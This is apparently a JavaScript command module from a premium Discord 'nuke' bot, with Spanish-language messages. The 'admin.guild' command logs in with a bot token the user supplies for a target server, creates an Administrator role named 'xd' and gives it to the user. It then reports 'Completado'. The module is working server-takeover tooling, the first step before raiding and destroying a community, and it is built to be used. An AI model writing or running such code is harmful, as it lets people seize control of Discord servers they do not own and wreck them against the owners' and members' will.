const { Client, ButtonBuilder, ButtonStyle, ActionRowBuilder, ComponentType, PermissionsBitField } = require('discord.js');
const fs = require('fs');

module.exports = {
    name: 'admin.guild',
    description: 'Gives you admin in a guild.',
    prefix: '#',
    premium: true,
    async execute(msg, client, channel_logs, blacklist_user, config_usuarios_premium) {
        try {
            const blacklist_pecausa = new ButtonBuilder()
                .setCustomId('xdxd')
                .setLabel('Blacklist User')
                .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
                .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({ components: [equisde], content: `Command **admin.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})` });
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int) => {
                if (int.customId === "xdxd") {
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]", "");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json', asd);
                    int.reply({ content: `> Usuario en blacklist.` });
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({ content: `> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.` });
            return;
        } else {
            if (!config_usuarios_premium[msg.author.id].bot_token_n) {
                await msg.channel.send({ content: `> No haz introducido ningún token de bot.` });
                return;
            } else {
                await msg.channel.send({ content: `> Obteniendo admin en la guild seleccionada...` });
                let namev = `client${msg.author.id}`;
                namev = new Client({ intents: [103423] });
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                await namev.guilds.cache.get(config_usuarios_premium[msg.author.id].guild_id);
                try {
                    const rolxd = await namev.guilds.cache.get(`${config_usuarios_premium[msg.author.id].guild_id}`).roles.create({ name: "xd", permissions: PermissionsBitField.Flags.Administrator }).catch(e => { });
                    await namev.guilds.cache.get(`${config_usuarios_premium[msg.author.id].guild_id}`).members.cache.get(`${msg.author.id}`).roles.add(rolxd.id);
                    await msg.channel.send({ content: `> Completado.` });
                } catch (e) {
                    msg.channel.send({ content: `> No se pudo obtener administrador.` });
                }
                namev.destroy();
            }
        };
    }
};
